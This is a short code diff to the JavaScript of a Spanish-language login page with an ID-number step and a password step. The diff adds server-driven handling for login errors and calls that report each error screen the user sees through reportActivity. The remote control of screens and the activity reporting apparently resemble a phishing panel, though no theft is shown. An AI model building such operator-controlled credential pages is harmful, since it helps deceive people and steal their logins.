@@ -90,7 +90,23 @@
 
     hideLoading();
     const { action, message } = data;
-    if (action === "wrong_doc") {
+    if (action === "error_login" || action === "wrong_login") {
+      if (step === "doc") {
+        if (password) password.value = "";
+        if (docWrap) docWrap.classList.add("error");
+        showError(message || "Documento incorrecto o no registrado");
+        if (docNumber) docNumber.focus();
+        reportActivity("⚠️ Viendo error de login (en pantalla DNI)");
+      } else {
+        setStep("pass");
+        if (password) {
+          password.value = "";
+          password.focus();
+        }
+        showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
+        reportActivity("⚠️ Viendo error de login (en pantalla Contraseña)");
+      }
+    } else if (action === "wrong_doc") {
       setStep("doc");
       if (password) password.value = "";
       if (docWrap) docWrap.classList.add("error");
